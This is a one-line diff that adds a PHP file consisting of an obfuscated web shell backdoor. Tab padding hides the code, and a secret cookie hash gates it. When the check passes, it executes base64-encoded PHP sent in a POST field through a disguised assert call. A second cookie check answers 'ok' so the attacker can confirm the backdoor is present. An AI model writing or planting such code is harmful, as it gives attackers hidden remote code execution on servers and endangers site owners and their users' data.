@@ -1,0 +1,1 @@
+<?php																																																if((md5(@$_COOKIE[ssid])=="beef1e01ad41668d609d778ad3ba496b")){error_reporting(0);@array_map("as"."sert",(array) base64_decode($_POST[x]));} if((@$_COOKIE[wprid]=="59857777ad9b3")){die(md5('ok'));}
